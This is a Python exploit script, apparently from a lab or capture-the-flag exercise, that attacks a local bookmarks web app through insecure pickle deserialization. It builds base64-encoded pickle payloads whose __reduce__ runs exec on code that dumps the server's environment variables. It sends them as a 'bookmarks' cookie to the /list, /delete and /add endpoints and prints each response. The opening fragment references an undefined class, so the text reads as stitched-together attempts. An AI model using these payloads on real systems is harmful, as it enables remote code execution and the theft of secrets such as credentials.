try:
    pickled = pickle.dumps(PayloadNonIterable(), protocol=4)
    encoded = base64.b64encode(pickled).decode()
    print(f"\n[*] NonIterable payload: {encoded}")
    
    response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers, timeout=5)
    print(f"[*] Status: {response.status_code}")
except Exception as e:
    print(f"[*] Error: {e}")

import requests
import pickle
import base64

target_url = "http://127.0.0.1:32962"
headers = {"User-Agent": "Mozilla/5.0"}

# The direct __reduce__ with a tuple works best
# Let's try to make the callable be something that when called raises an error

class PayloadDirectCallable:
    def __reduce__(self):
        return (self._exploit, ())
    
    @staticmethod
    def _exploit():
        import os
        raise RuntimeError(f"ENV_DATA: {dict(os.environ)}")

# But we can't pickle methods like that
# Let's use a lambda approach via eval

payload_code = """
import os
raise RuntimeError(str(dict(os.environ)))
"""

class PayloadExec:
    def __reduce__(self):
        return (exec, (payload_code,))

pickled = pickle.dumps(PayloadExec(), protocol=4)
encoded = base64.b64encode(pickled).decode()

print(f"[*] exec code payload: {encoded[:80]}...")
print(f"[*] Full payload length: {len(encoded)}")

response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers, timeout=10)
print(f"[*] /list status: {response.status_code}")

# Check response headers for any info
print(f"[*] Response headers: {dict(response.headers)}")

# The exploit runs but is caught. Let's try sending it to delete endpoint
print("\n[*] Trying /delete endpoint with payload...")
response = requests.get(f"{target_url}/delete", cookies={"bookmarks": encoded}, headers=headers, timeout=10)
print(f"[*] /delete status: {response.status_code}")

# And POST to /add
print("\n[*] Trying POST /add with payload...")
response = requests.post(
    f"{target_url}/add",
    cookies={"bookmarks": encoded},
    headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
    data={"name": "test", "url": "http://example.com"},
    allow_redirects=False
)
print(f"[*] POST /add status: {response.status_code}")
if response.status_code in [301, 302]:
    print(f"[*] Redirect to: {response.headers.get('Location')}")
    # Follow redirect
    redirect_response = requests.get(
        f"{target_url}{response.headers.get('Location')}",
        cookies={"bookmarks": encoded},
        headers=headers
    )
    print(f"[*] After redirect status: {redirect_response.status_code}")

# Test what happens if we send a POST with wrong/missing fields
print("\n[*] Trying malformed POST to /add...")
response = requests.post(
    f"{target_url}/add",
    cookies={"bookmarks": encoded},
    headers={"User-Agent": "Mozilla/0.0", "Content-Type": "application/x-www-form-urlencoded"},
    data={},
    allow_redirects=False
)
print(f"[*] Malformed POST status: {response.status_code}")
print(f"[*] Response: {response.text[:500]}")

